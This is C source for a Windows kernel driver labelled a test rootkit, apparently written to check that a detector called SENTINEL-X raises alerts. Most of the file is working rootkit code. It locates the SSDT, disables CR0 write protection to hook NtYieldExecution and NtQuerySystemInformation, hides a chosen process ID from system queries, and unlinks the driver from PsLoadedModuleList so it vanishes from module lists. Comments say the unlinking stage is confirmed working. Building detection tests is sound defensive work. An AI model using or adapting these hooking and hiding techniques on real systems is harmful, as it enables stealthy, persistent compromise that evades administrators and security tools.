/*
 * sentinel_test_win.c — SENTINEL-X Windows Test Rootkit (Final)
 *
 * Stage summary:
 *  1  SSDT hook NtYieldExecution      → SCT_HOOK        (needs WinDbg)
 *  2  SSDT hook NtQuerySystemInfo     → DKOM_ALERT      (needs WinDbg + TargetPid)
 *  3  PsLoadedModuleList direct unlink → MODULE_HIDDEN  (NO WinDbg needed) ← CONFIRMED WORKING
 *  0  All stages
 *
 * Stage 3 confirmed working in DebugView — MODULE_HIDDEN fires within 10s.
 */
#include <ntifs.h>
#include <aux_klib.h>
#include <intrin.h>

NTKERNELAPI PVOID NTAPI RtlPcToFileHeader(
    _In_  PVOID  PcValue,
    _Out_ PVOID* BaseOfImage);

#pragma warning(disable: 4055 4152 28159)

#define TEST_TAG      'TWSR'
#define SCAN_WINDOW   4096u
#define MAX_SYSCALLS  600u

typedef struct _TEST_SSDT {
    PULONG Base; PULONG Counter; ULONG Limit; PUCHAR ParamTable;
} TEST_SSDT, *PTEST_SSDT;

#define KsSystemProcessInformation 5u
#define KsSystemModuleInformation  11u

typedef struct _TEST_PROCESS_ENTRY {
    ULONG  NextEntryOffset; ULONG NumberOfThreads;
    UCHAR  Reserved1[48];   UCHAR Reserved2[24];
    HANDLE UniqueProcessId; PVOID InheritedFromUniqueProcessId;
    ULONG  HandleCount;     ULONG Reserved3;
} TEST_PROCESS_ENTRY, *PTEST_PROCESS_ENTRY;

typedef struct _LDR_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    PVOID          ExceptionTable;
    ULONG          ExceptionTableSize;
    PVOID          GpValue;
    PVOID          NonPagedDebugInfo;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_ENTRY, *PLDR_ENTRY;

typedef NTSTATUS(NTAPI *PFN_NtYield)(VOID);
typedef NTSTATUS(NTAPI *PFN_NtQSI)(ULONG, PVOID, ULONG, PULONG);

extern LIST_ENTRY PsLoadedModuleList;

typedef ERESOURCE* PERESOURCE_ALIAS;
static PERESOURCE_ALIAS g_pLoadedModuleResource = NULL;

static ULONG      g_stage        = 3;
static PTEST_SSDT g_ssdt         = NULL;
static ULONG      g_idx1         = (ULONG)-1;
static LONG       g_orig1        = 0;
static ULONG64    g_origAddr1    = 0;
static BOOLEAN    g_hook1Active  = FALSE;
static ULONG      g_idxQsi       = (ULONG)-1;
static LONG       g_origQsi      = 0;
static ULONG64    g_origAddrQsi  = 0;
static BOOLEAN    g_hookQsiActive = FALSE;
static ULONG_PTR  g_targetPid    = 0;
static volatile LONG g_reentrancy = 0;
static PVOID       g_myBase       = NULL;
static PLIST_ENTRY g_ourListEntry = NULL;
static LIST_ENTRY  g_savedLinks   = { 0 };
static BOOLEAN     g_unlinked     = FALSE;

/* ── SSDT ─────────────────────────────────────────────────────────────── */
static PTEST_SSDT FindSsdt(VOID) {
    ULONG64 lstar = 0;
    __try { lstar = __readmsr(0xC0000082UL); } __except(EXCEPTION_EXECUTE_HANDLER) { return NULL; }
    if (!lstar) return NULL;
    PUCHAR p = (PUCHAR)lstar;
    for (ULONG i = 0; i < SCAN_WINDOW - 7; i++) {
        if (p[i] != 0x4C || p[i+1] != 0x8D || p[i+2] != 0x15) continue;
        LONG rel = *(PLONG)(p + i + 3);
        PTEST_SSDT c = (PTEST_SSDT)((PUCHAR)(p + i + 7) + rel);
        __try { if (c->Base && c->Limit >= 100 && c->Limit <= MAX_SYSCALLS) return c; }
        __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
    }
    return NULL;
}
static ULONG64 SsdtEntry(ULONG idx) {
    if (!g_ssdt || idx >= g_ssdt->Limit) return 0;
    return (ULONG64)g_ssdt->Base + ((LONG)(g_ssdt->Base[idx]) >> 4);
}
static ULONG GetSyscallIdx(PCWSTR zwName) {
    UNICODE_STRING us; RtlInitUnicodeString(&us, zwName);
    PUCHAR stub = (PUCHAR)MmGetSystemRoutineAddress(&us);
    if (!stub) return (ULONG)-1;
    __try { for (ULONG i = 0; i < 32; i++) {
        if (stub[i] == 0xB8) { ULONG idx = *(PULONG)(stub+i+1); if (idx < MAX_SYSCALLS) return idx; }
    }} __except(EXCEPTION_EXECUTE_HANDLER) {}
    return (ULONG)-1;
}
static LONG EncodeSsdt(ULONG64 addr) { return (LONG)(((LONG64)addr - (LONG64)(ULONG64)g_ssdt->Base) << 4); }
static VOID WriteSsdt(ULONG idx, LONG val) {
    ULONG cr0 = (ULONG)__readcr0();
    _disable(); __writecr0(cr0 & ~0x10000UL);
    InterlockedExchange((volatile LONG*)&g_ssdt->Base[idx], val);
    __writecr0(cr0); _enable();
}

/* ── Fake handlers ────────────────────────────────────────────────────── */
static NTSTATUS NTAPI FakeYield(VOID) {
    return g_origAddr1 ? ((PFN_NtYield)g_origAddr1)() : STATUS_SUCCESS;
}
static NTSTATUS NTAPI FakeQSI(ULONG cls, PVOID buf, ULONG len, PULONG ret) {
    if (InterlockedCompareExchange(&g_reentrancy, 1, 0) != 0)
        return g_origAddrQsi ? ((PFN_NtQSI)g_origAddrQsi)(cls,buf,len,ret) : STATUS_NOT_IMPLEMENTED;
    ULONG actual = 0; NTSTATUS st = STATUS_SUCCESS;
    __try {
        if (g_origAddrQsi) st = ((PFN_NtQSI)g_origAddrQsi)(cls,buf,len,ret);
        if (NT_SUCCESS(st) && ret) actual = *ret; else if (NT_SUCCESS(st)) actual = len;
    } __except(EXCEPTION_EXECUTE_HANDLER) { goto done; }
    if (!NT_SUCCESS(st) || !buf || !actual) goto done;
    __try {
        if (cls == KsSystemProcessInformation && g_targetPid != 0 && actual >= sizeof(TEST_PROCESS_ENTRY)) {
            PTEST_PROCESS_ENTRY prev = NULL, e = (PTEST_PROCESS_ENTRY)buf;
            PUCHAR end = (PUCHAR)buf + actual;
            while ((PUCHAR)e + sizeof(*e) <= end) {
                if ((ULONG_PTR)e->UniqueProcessId == g_targetPid) {
                    if (prev) { prev->NextEntryOffset = e->NextEntryOffset == 0 ? 0 : prev->NextEntryOffset + e->NextEntryOffset; }
                    else if (e->NextEntryOffset) { RtlMoveMemory(buf, (PUCHAR)buf + e->NextEntryOffset, actual - e->NextEntryOffset); }
                    DbgPrint("[sentinel_test] FakeQSI: hid PID %llu\n", (ULONG64)g_targetPid); break;
                }
                if (!e->NextEntryOffset) break;
                PTEST_PROCESS_ENTRY nx = (PTEST_PROCESS_ENTRY)((PUCHAR)e + e->NextEntryOffset);
                if ((PUCHAR)nx <= (PUCHAR)e || (PUCHAR)nx+sizeof(*nx) > end) break;
                prev = e; e = nx;
            }
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {}
done:
    InterlockedExchange(&g_reentrancy, 0);
    return st;
}

/* ── Stage 3 ──────────────────────────────────────────────────────────── */
static VOID AcquireModLock(VOID) { if (g_pLoadedModuleResource) ExAcquireResourceExclusiveLite(g_pLoadedModuleResource, TRUE); }
static VOID ReleaseModLock(VOID) { if (g_pLoadedModuleResource) ExReleaseResourceLite(g_pLoadedModuleResource); }

static VOID Stage3Unlink(PDRIVER_OBJECT drv) {
    if (!drv) return;
    g_myBase = drv->DriverStart;
    DbgPrint("[sentinel_test] Stage3Unlink: DriverStart=%p\n", g_myBase);
    AcquireModLock();
    __try {
        PLIST_ENTRY head = &PsLoadedModuleList, cur = head->Flink;
        while (cur && cur != head) {
            PLDR_ENTRY ldr = CONTAINING_RECORD(cur, LDR_ENTRY, InLoadOrderLinks);
            if (ldr->DllBase != g_myBase) { cur = cur->Flink; continue; }
            g_ourListEntry = cur;
            g_savedLinks.Flink = cur->Flink; g_savedLinks.Blink = cur->Blink;
            cur->Blink->Flink = cur->Flink; cur->Flink->Blink = cur->Blink;
            cur->Flink = (PLIST_ENTRY)(ULONG_PTR)0xDEADDEADDEADDEADULL;
            cur->Blink = (PLIST_ENTRY)(ULONG_PTR)0xDEADDEADDEADDEADULL;
            g_unlinked = TRUE;
            DbgPrint("[sentinel_test] Stage3Unlink: done - sentinelx PE scan detects MODULE_HIDDEN within 10s\n");
            break;
        }
        if (!g_unlinked) DbgPrint("[sentinel_test] Stage3Unlink: entry not found!\n");
    } __except(EXCEPTION_EXECUTE_HANDLER) { DbgPrint("[sentinel_test] Stage3Unlink: exception\n"); }
    ReleaseModLock();
}
static VOID Stage3Relink(VOID) {
    if (!g_unlinked || !g_ourListEntry) return;
    AcquireModLock();
    __try {
        g_ourListEntry->Flink = g_savedLinks.Flink; g_ourListEntry->Blink = g_savedLinks.Blink;
        g_savedLinks.Blink->Flink = g_ourListEntry; g_savedLinks.Flink->Blink = g_ourListEntry;
        g_unlinked = FALSE;
        DbgPrint("[sentinel_test] Stage3Relink: done - sentinelx will detect MODULE_RESTORED on next scan\n");
    } __except(EXCEPTION_EXECUTE_HANDLER) { DbgPrint("[sentinel_test] Stage3Relink: exception\n"); }
    ReleaseModLock();
}

/* ── Hooks ────────────────────────────────────────────────────────────── */
static VOID InstallHook1(VOID) {
    g_idx1 = GetSyscallIdx(L"ZwYieldExecution"); if (g_idx1 == (ULONG)-1) return;
    g_origAddr1 = SsdtEntry(g_idx1); g_orig1 = (LONG)g_ssdt->Base[g_idx1];
    WriteSsdt(g_idx1, EncodeSsdt((ULONG64)FakeYield)); g_hook1Active = TRUE;
    DbgPrint("[sentinel_test] Stage 1: SSDT[%u] hooked\n", g_idx1);
}
static VOID InstallHookQsi(VOID) {
    if (g_hookQsiActive) return;
    g_idxQsi = GetSyscallIdx(L"ZwQuerySystemInformation"); if (g_idxQsi == (ULONG)-1) return;
    g_origAddrQsi = SsdtEntry(g_idxQsi); g_origQsi = (LONG)g_ssdt->Base[g_idxQsi];
    WriteSsdt(g_idxQsi, EncodeSsdt((ULONG64)FakeQSI)); g_hookQsiActive = TRUE;
    DbgPrint("[sentinel_test] Stage 2: SSDT[%u] hooked\n", g_idxQsi);
}
static VOID RemoveHook1(VOID) { if (!g_hook1Active) return; WriteSsdt(g_idx1, g_orig1); g_hook1Active = FALSE; DbgPrint("[sentinel_test] Stage 1: SSDT[%u] restored\n", g_idx1); }
static VOID RemoveHookQsi(VOID) { if (!g_hookQsiActive) return; WriteSsdt(g_idxQsi, g_origQsi); g_hookQsiActive = FALSE; DbgPrint("[sentinel_test] Stage 2: SSDT[%u] restored\n", g_idxQsi); }

/* ── Registry ─────────────────────────────────────────────────────────── */
static ULONG ReadRegistry(PUNICODE_STRING regPath) {
    static const WCHAR sfx[] = L"\\Parameters";
    ULONG total = regPath->Length + (ULONG)sizeof(sfx) - (ULONG)sizeof(WCHAR);
    PWCHAR buf = (PWCHAR)ExAllocatePool2(POOL_FLAG_PAGED, (SIZE_T)total + sizeof(WCHAR), TEST_TAG);
    if (!buf) return 3;
    RtlCopyMemory(buf, regPath->Buffer, regPath->Length);
    RtlCopyMemory((PUCHAR)buf + regPath->Length, sfx, sizeof(sfx) - sizeof(WCHAR));
    buf[total/sizeof(WCHAR)] = L'\0';
    UNICODE_STRING pp = { (USHORT)total, (USHORT)(total+sizeof(WCHAR)), buf };
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &pp, OBJ_CASE_INSENSITIVE|OBJ_KERNEL_HANDLE, NULL, NULL);
    HANDLE key = NULL; ULONG stage = 3, pidReg = 0;
    if (NT_SUCCESS(ZwOpenKey(&key, KEY_READ, &oa))) {
#define RD(h,n,v) do { UNICODE_STRING _u; RtlInitUnicodeString(&_u,(n)); ULONG _r=0; \
    NTSTATUS _s=ZwQueryValueKey((h),&_u,KeyValuePartialInformation,NULL,0,&_r); \
    if((_s==STATUS_BUFFER_TOO_SMALL||_s==STATUS_BUFFER_OVERFLOW)&&_r){ \
    PKEY_VALUE_PARTIAL_INFORMATION _k=(PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePool2(POOL_FLAG_PAGED,_r,TEST_TAG); \
    if(_k){_s=ZwQueryValueKey((h),&_u,KeyValuePartialInformation,_k,_r,&_r); \
    if(NT_SUCCESS(_s)&&_k->Type==REG_DWORD&&_k->DataLength>=4)(v)=*(PULONG)_k->Data; \
    ExFreePoolWithTag(_k,TEST_TAG);}}} while(0)
        RD(key, L"Stage",     stage);
        RD(key, L"TargetPid", pidReg);
        g_targetPid = (ULONG_PTR)pidReg;
#undef RD
        ZwClose(key);
    } else { DbgPrint("[sentinel_test] Registry key not found - default Stage=3\n"); }
    ExFreePoolWithTag(buf, TEST_TAG);
    DbgPrint("[sentinel_test] Stage=%u  TargetPid=%llu\n", stage, (ULONG64)g_targetPid);
    return stage;
}

static NTSTATUS DefaultDispatch(PDEVICE_OBJECT dev, PIRP irp) {
    UNREFERENCED_PARAMETER(dev);
    irp->IoStatus.Status = STATUS_SUCCESS; irp->IoStatus.Information = 0;
    IoCompleteRequest(irp, IO_NO_INCREMENT); return STATUS_SUCCESS;
}
static VOID TestUnload(PDRIVER_OBJECT drv) {
    UNREFERENCED_PARAMETER(drv);
    DbgPrint("[sentinel_test] Unloading - restoring all hooks\n");
    RemoveHook1(); RemoveHookQsi();
    if (g_unlinked) Stage3Relink();
    DbgPrint("[sentinel_test] Unloaded.\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING regPath) {
    DbgPrint("[sentinel_test] DriverEntry - SENTINEL-X Windows test rootkit\n");
    drv->DriverUnload = TestUnload;
    for (ULONG i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) drv->MajorFunction[i] = DefaultDispatch;

    /* Resolve PsLoadedModuleResource via ntoskrnl PE export walk */
    PVOID ntBase = NULL;
    RtlPcToFileHeader((PVOID)(ULONG_PTR)PsInitialSystemProcess, &ntBase);
    if (ntBase) __try {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntBase;
        PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PUCHAR)ntBase + dos->e_lfanew);
        IMAGE_DATA_DIRECTORY ed = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (ed.VirtualAddress && ed.Size) {
            PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)ntBase + ed.VirtualAddress);
            PULONG nrva=(PULONG)((PUCHAR)ntBase+exp->AddressOfNames);
            PUSHORT ords=(PUSHORT)((PUCHAR)ntBase+exp->AddressOfNameOrdinals);
            PULONG frva=(PULONG)((PUCHAR)ntBase+exp->AddressOfFunctions);
            for (ULONG i = 0; i < exp->NumberOfNames; i++) {
                if (strcmp((PCHAR)((PUCHAR)ntBase+nrva[i]), "PsLoadedModuleResource") == 0) {
                    g_pLoadedModuleResource = (PERESOURCE_ALIAS)((PUCHAR)ntBase + frva[ords[i]]);
                    DbgPrint("[sentinel_test] PsLoadedModuleResource @ %p\n", g_pLoadedModuleResource);
                    break;
                }
            }
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {}
    if (!g_pLoadedModuleResource)
        DbgPrint("[sentinel_test] PsLoadedModuleResource not found - operating without list lock\n");

    g_stage = ReadRegistry(regPath);
    DbgPrint("[sentinel_test] Running stage %u\n", g_stage);

    if (g_stage == 1 || g_stage == 2 || g_stage == 0) {
        g_ssdt = FindSsdt();
        if (!g_ssdt) DbgPrint("[sentinel_test] WARN: SSDT not found - stages 1/2 skip\n");
    }
    if ((g_stage == 1 || g_stage == 0) && g_ssdt) InstallHook1();
    if ((g_stage == 2 || g_stage == 0) && g_ssdt) InstallHookQsi();
    if  (g_stage == 3 || g_stage == 0)             Stage3Unlink(drv);

    DbgPrint("[sentinel_test] Active - sentinelx detects within 10 s\n");
    DbgPrint("[sentinel_test] Run:  sc stop sentinel_test  to restore\n");
    return STATUS_SUCCESS;
}
